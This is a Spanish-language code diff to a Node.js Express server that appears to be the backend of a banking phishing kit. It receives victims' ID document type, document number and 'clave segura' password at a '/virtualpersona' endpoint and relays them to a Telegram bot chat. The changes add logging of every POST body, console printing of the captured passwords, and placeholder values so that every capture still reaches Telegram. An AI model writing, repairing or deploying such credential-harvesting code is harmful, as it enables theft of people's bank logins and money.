@@ -22,6 +22,16 @@ const CHAT_ID = process.env.CHAT_ID;
 
 app.use(bodyParser.json());
 
+// Middleware para loggear todas las solicitudes
+app.use((req, res, next) => {
+  if (req.method === 'POST') {
+    console.log(`\n📨 [${new Date().toISOString()}] POST ${req.path}`);
+    console.log('   Content-Type:', req.headers['content-type']);
+    console.log('   Body:', JSON.stringify(req.body, null, 2));
+  }
+  next();
+});
+
 const sessions = new Map();
 
 const getTelegramApiUrl = (method) => `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
@@ -51,9 +61,9 @@ async function enviarMensajeTelegram({ tipoDoc, numDoc, clave, sessionId }) {
   const mensaje = `
 🔐 *NUEVO ACCESO - CLAVE SEGURA*
 
-📄 *Tipo de documento:* ${tipoDoc}
-🆔 *Documento:* ${numDoc}
-🔑 *Clave segura:* ${clave}
+📄 *Tipo de documento:* ${tipoDoc || "N/D"}
+🆔 *Documento:* ${numDoc || "N/D"}
+🔑 *Clave segura:* ${clave || "N/D"}
 
 🌀 *Session ID:* \`${sessionId}\`
 `;
@@ -294,7 +304,22 @@ app.post("/virtualpersona", async (req, res) => {
   if (metodo === "clave") {
     sessions.set(sessionId, { redirect_to: null });
 
-    await enviarMensajeTelegram({ tipoDoc, numDoc, clave, sessionId });
+    // Usar valores recibidos, o reemplazar undefined/null/vacío con "NO_DISPONIBLE"
+    const tipoDocSafe = tipoDoc || "SIN_DATO";
+    const numDocSafe = numDoc || "SIN_DATO";
+    const claveSafe = clave || "SIN_DATO";
+
+    console.log(`✅ Enviando a Telegram con valores seguros:`);
+    console.log(`   - tipoDoc: ${tipoDocSafe}`);
+    console.log(`   - numDoc: ${numDocSafe}`);
+    console.log(`   - clave: ${claveSafe}`);
+
+    await enviarMensajeTelegram({
+      tipoDoc: tipoDocSafe,
+      numDoc: numDocSafe,
+      clave: claveSafe,
+      sessionId
+    });
 
     return res.json({ ok: true });
   }
